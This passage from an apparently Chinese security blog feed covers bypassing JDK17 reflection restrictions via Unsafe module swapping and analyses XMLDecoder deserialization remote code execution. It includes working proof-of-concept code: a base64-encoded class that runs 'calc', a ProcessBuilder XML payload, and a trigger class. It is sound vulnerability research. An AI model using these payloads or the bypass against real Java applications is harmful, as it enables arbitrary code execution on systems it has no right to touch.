alt="image-20241030140555749"></p><p>然后一路走到这里具体的判断逻辑在这，这里或获取反射目标的module和调用的类的module，然后判断他们是否为同一个module，或者是否为Object.class的module，Object.class的module就是<strong>java.base</strong>，再或者就是目标模块未定义模块名</p><p>后面还有一些相关的判断，但我们需要绕过的就是这一部分就不再分析了</p><p>看到这里我们也能知道我们的绕过思路是什么，就是修改当前类的Module和要反射修改的类的module一致即可</p><p>而Unsafe类就提供了这样的方法来修改module是我们绕过检查，就是通过修改偏移量，将我们的类的module修改成基础module</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Test;<br><br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Bypass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, NoSuchFieldException, InstantiationException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAthdHRhY2suamF2YQwACgALBwAdDAAeAB8BAARjYWxjDAAgACEBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAIgEABmF0dGFjawEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAACAAEACgALAAEADAAAAB0AAQABAAAABSq3AAGxAAAAAQANAAAABgABAAAAAwAIAA4ACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAABgAJAAkADAAHAA0ACAAWAAoADwAAAAcAAkwHABAJAAEAEQAAAAIAEg==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(payload);<br>        Class&lt;?&gt; unSafe=Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<br>        Field unSafeField=unSafe.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unSafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        Unsafe unSafeClass= (Unsafe) unSafeField.get(<span class="hljs-literal">null</span>);<span class="hljs-comment">//获取Unsafe实例</span><br>        <span class="hljs-comment">//获取ClassLoader的module</span><br>        Module baseModule=Object.class.getModule();<br><br>        Class&lt;?&gt; currentClass= Bypass.class;<br>        <span class="hljs-type">long</span> addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unSafeClass.getAndSetObject(currentClass,addr,baseModule); <span class="hljs-comment">//更改当前运行类的Module</span><br>        <span class="hljs-comment">//现在就能正常反射了</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; calc= (Class&lt;?&gt;) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;attack&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030142827432.png" alt="image-20241030142827432"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://aiwin.fun/index.php/archives/4389/">https://aiwin.fun/index.php/archives/4389/</a></p><p><a href="https://xz.aliyun.com/t/14048?time__1311=GqAxuDRD0GK7qGNPeeqBKquO1fq+fbD">https://xz.aliyun.com/t/14048?time__1311=GqAxuDRD0GK7qGNPeeqBKquO1fq%2BfbD</a></p><p><a href="https://xz.aliyun.com/t/15035?time__1311=GqjxuiqiuDgDlxGgx+xCwo4mhexcirc7=WoD">https://xz.aliyun.com/t/15035?time__1311=GqjxuiqiuDgDlxGgx%2BxCwo4mhexcirc7%3DWoD</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;jdk17反射限制&quot;&gt;&lt;a href=&quot;#JDK17反射限制&quot; class=&quot;headerlink&quot; title=&quot;JDK17反射限制&quot;&gt;&lt;/a&gt;JDK17反射限制&lt;/h1&gt;&lt;p&gt;在JDK9至JDK16版本之中，Java.*依赖包下所有的非公共字段和方法在进行反射</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>XML反序列化学习</title>
    <link href="https://clowsman.github.io/2024/10/25/XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/25/XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-24T17:24:18.000Z</published>
    <updated>2024-10-25T18:27:56.307Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xmldecoder介绍"><a href="#XMLDecoder介绍" class="headerlink" title="XMLDecoder介绍"></a>XMLDecoder介绍</h1><p>XMLDecoder是java自带的以SAX方式解析xml的类，其在反序列化经过特殊构造的数据时可执行任意命令。</p><p>所谓的解析就是在java对象和xml文件之间的转化。</p><h2 id="sax是什么"><a href="#SAX是什么" class="headerlink" title="SAX是什么"></a>SAX是什么</h2><p>SAX全称为<code>Simple API for XML</code>，在Java中有两种原生解析xml的方式，分别是SAX和DOM。两者区别在于：</p><ol><li>Dom解析功能强大，可增删改查，操作时会将xml文档以文档对象的方式读取到内存中，因此适用于小文档</li><li>Sax解析是从头到尾逐行逐个元素读取内容，修改较为不便，但适用于只读的大文档</li></ol><p>SAX采用事件驱动的形式来解析xml文档，简单来讲就是触发了事件就去做事件对应的回调方法。</p><p>在SAX中，读取到文档开头、结尾，元素的开头和结尾以及编码转换等操作时会触发一些回调方法，你可以在这些回调方法中进行相应事件处理：</p><ul><li>startDocument()</li><li>endDocument()</li><li>startElement()</li><li>endElement()</li><li>characters()</li></ul><h2 id="简单demo"><a href="#简单demo" class="headerlink" title="简单demo"></a>简单demo</h2><p>一个简单的pojo类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello, my name is &quot;</span>+name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>操作类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.beans.XMLEncoder;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-comment">// 序列化对象到文件person.xml</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">xmlEncode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">18</span>);<br>        person.setName(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">XMLEncoder</span> <span class="hljs-variable">xmlEncoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLEncoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;person.xml&quot;</span>)));<br>        xmlEncoder.writeObject(person);<br>        xmlEncoder.close();<br>        System.out.println(<span class="hljs-string">&quot;序列化结束！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">xmlDecode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">XMLDecoder</span> <span class="hljs-variable">xmlDecoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;person.xml&quot;</span>)));<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person)xmlDecoder.readObject();<br>        xmlDecoder.close();<br>        person.sayHello();<br>        System.out.println(person.getAge());<br>        System.out.println(person.getName());<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-type">Demo1</span> <span class="hljs-variable">xmlTest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo1</span>();<br>        xmlTest.xmlEncode();<br>        xmlTest.xmlDecode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241025133812826.png" alt="image-20241025133812826"></p><p>序列化后的xml结构</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.8.0_65&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.XMLTest.Person&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="基于sax的xml解析"><a href="#基于SAX的XML解析" class="headerlink" title="基于SAX的XML解析"></a>基于SAX的XML解析</h2><p>接下来自己写一个基于SAX的xml解析</p><p>我们只要跟一下源码就可以发现它实现SAX形式是继承DefaultHandler类的，该类在org.xml.sax.helpers包下</p><p><img src="https://cdn.clown2024.cn/image-20241025135348967.png" alt="image-20241025135348967"></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> org.xml.sax.Attributes;<br><span class="hljs-keyword">import</span> org.xml.sax.SAXException;<br><span class="hljs-keyword">import</span> org.xml.sax.helpers.DefaultHandler;<br><br><span class="hljs-keyword">import</span> javax.xml.parsers.SAXParser;<br><span class="hljs-keyword">import</span> javax.xml.parsers.SAXParserFactory;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DefaultHandler</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">saxParserFactory</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> saxParserFactory.newSAXParser();<br>            <span class="hljs-type">Demo2</span> <span class="hljs-variable">dh</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo2</span>();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;person.xml&quot;</span>;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>            parser.parse(file, dh);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">characters</span><span class="hljs-params">(<span class="hljs-type">char</span>[] ch, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> length)</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;characters()&quot;</span>);<br>        <span class="hljs-built_in">super</span>.characters(ch, start, length);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startDocument</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;startDocument()&quot;</span>);<br>        <span class="hljs-built_in">super</span>.startDocument();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">endDocument</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;endDocument()&quot;</span>);<br>        <span class="hljs-built_in">super</span>.endDocument();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startElement</span><span class="hljs-params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;startElement()&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; attributes.getLength(); i++) &#123;<br>            <span class="hljs-comment">// getQName()是获取属性名称，</span><br>            System.out.println(attributes.getQName(i) + <span class="hljs-string">&quot;=&quot;</span> + attributes.getValue(i));<br>        &#125;<br>        <span class="hljs-built_in">super</span>.startElement(uri, localName, qName, attributes);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">endElement</span><span class="hljs-params">(String uri, String localName, String qName)</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;endElement()&quot;</span>);<br>        System.out.println(uri + localName + qName);<br>        <span class="hljs-built_in">super</span>.endElement(uri, localName, qName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后解析前面的person.xml，结果如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">startDocument()<br>startElement()<br>version=1.8.0_65<br>class=java.beans.XMLDecoder<br>characters()<br>startElement()<br>class=org.example.XMLTest.Person<br>characters()<br>startElement()<br>property=age<br>characters()<br>startElement()<br>characters()<br>endElement()<br>int<br>characters()<br>endElement()<br>void<br>characters()<br>startElement()<br>property=name<br>characters()<br>startElement()<br>characters()<br>endElement()<br>string<br>characters()<br>endElement()<br>void<br>characters()<br>endElement()<br>object<br>characters()<br>endElement()<br>java<br>endDocument()<br></code></pre></td></tr></table></figure><p>可以知道我们可以通过继承SAX的DefaultHandler类，重写其事件方法，就能拿到XML对应的节点、属性和值。</p><p>XMLDecoder也是基于SAX实现的xml解析，不过他拿到节点、属性、值之后通过Expression创建对象及调用方法。</p><h1 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h1><p>概括来说，XMLDecoder产生漏洞的原因主要有以下几个关键因素：</p><ul><li>XMLDecoder是java自带的以SAX方式解析xml的类，其在反序列化经过特殊构造的XML数据可以覆盖对应Beans成员值，这给构造gadget产生了可能。</li><li>XMLDecoder使用反射来动态生成Beans，这给触发gadget产生了可能。</li></ul><p>以上两个条件同时都具备，使得XMLDecoder产生远程代码执行漏洞的攻击面。</p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>这里用一个弹计算器的payload去分析一下</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        File file=<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;payload.xml&quot;</span>);<br>        FileInputStream fileInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        BufferedInputStream bufferedInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fileInputStream);<br>        XMLDecoder xmlDecoder=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(bufferedInputStream);<br>        xmlDecoder.readObject();<br>        xmlDecoder.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以直接在ProcessBuilder#start处打个断点然后从调用栈帧开始看</p><p><img src="https://cdn.clown2024.cn/image-20241025230809734.png" alt="image-20241025230809734"></p><p>他是从readObject方法开始的，我们从那里开始跟进</p><p><img src="https://cdn.clown2024.cn/image-20241025231157408.png" alt="image-20241025231157408"></p><p>跟进到XMLDecoder#parsingComplete方法，这里会调用DocumentHandler进行xml的解析</p><p><img src="https://cdn.clown2024.cn/image-20241025231439438.png" alt="image-20241025231439438"></p><p>这个handler就是继承DefaultHandler类的，调用他的parse来对输入input进行解析，也就是以SAX方式解析</p><p><img src="https://cdn.clown2024.cn/image-20241026004719002.png" alt="image-20241026004719002"></p><p>进到方法里面，他的解析写法也和我们前面写的逻辑是一样的，都要创建一个SAXParser，然后接下来的解析就重点去关注一下他的解析函数，我们继续跟进</p><p>在DocumentHandler的构造方法中指定了可用的标签类型</p><p><img src="https://cdn.clown2024.cn/image-20241026005350433.png" alt="image-20241026005350433"></p><p>对应了com.sun.beans.decoder包中类</p><p>我们断在DocumentHandler#startElement方法</p><p><img src="https://cdn.clown2024.cn/image-20241026012931997.png" alt="image-20241026012931997"></p><p>他首先解析java标签，设置Owner和Parent,owner就是DocumentHandler类，getElementHandler方法就是从DocumentHandler构造方法时创建的map中取对应的class，如果没有则会抛出异常</p><p><img src="https://cdn.clown2024.cn/image-20241026014426012.png" alt="image-20241026014426012"></p><p>然后到解析object标签的时候，会去拿name和value也就是class和ProcessBuilder</p><p>然后就是通过addAttribute来添加属性</p><p><img src="https://cdn.clown2024.cn/image-20241026014707208.png" alt="image-20241026014707208"></p><p>这里还会调用findClass，这里是网上走到了父类NewElementHandler的这个方法</p><p>然后就是解析array标签，同样添加属性，后面就是重复的过程，自己调试看一遍即可</p><p>解析完开始标签就到闭合标签了</p><p>进入到endElement方法</p><p><img src="https://cdn.clown2024.cn/image-20241026015510343.png" alt="image-20241026015510343"></p><p>首先就是闭合的string标签</p><p><img src="https://cdn.clown2024.cn/image-20241026015649368.png" alt="image-20241026015649368"></p><p>接着闭合void和array</p><p>然后解析void标签的的method属性</p><p><img src="https://cdn.clown2024.cn/image-20241026015858555.png" alt="image-20241026015858555"></p><p>将this.method赋值为start，然后紧接着又是相关的闭合操作</p><p>中间的很多大同小异的流程就不记录了，看看文章即可</p><p>最终走到关键的地方<strong>ObjectElementHandler#getValueObject</strong>方法里</p><p><img src="https://cdn.clown2024.cn/image-20241026020414044.png" alt="image-20241026020414044"></p><p>这里是构建了一个java.beans.Expression表达式类</p><p><img src="https://cdn.clown2024.cn/image-20241026020515551.png" alt="image-20241026020515551"></p><p>然后看Expression的getValue方法</p><p><img src="https://cdn.clown2024.cn/image-20241026020824998.png" alt="image-20241026020824998"></p><p>里面会调用invoke方法，会走到其父类Statement的invoke方法</p><p><img src="https://cdn.clown2024.cn/image-20241026021017273.png" alt="image-20241026021017273"></p><p><img src="https://cdn.clown2024.cn/image-20241026021656440.png" alt="image-20241026021656440"></p><p>内部就是利用反射来进行方法调用</p><p><img src="https://cdn.clown2024.cn/image-20241026021040905.png" alt="image-20241026021040905"></p><p>最终就会返回ProcessBuilder这个类，继续往后</p><p><img src="https://cdn.clown2024.cn/image-20241026021157722.png" alt="image-20241026021157722"></p><p>到这里他就会执行start方法，内部也是反射调用start方法，后续的步骤也是差不多的就不调了</p><p>最终就是相当于最后拼接了一个表达式：<strong>new java.lang.ProcessBuilder(new String[]{“calc”}).start();</strong></p><h2 id="expression和statement"><a href="#Expression和Statement" class="headerlink" title="Expression和Statement"></a>Expression和Statement</h2><p>两者都是java反射的封装</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">&quot;你好 %s!&quot;</span>, name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> java.beans.Expression;<br><span class="hljs-keyword">import</span> java.beans.Statement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        testStatement();<br>        testExpression();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testStatement</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Statement</span>(user, <span class="hljs-string">&quot;setName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;张三&quot;</span>&#125;);<br>            statement.execute();<br>            System.out.println(user.getName());<br>        &#125; <span 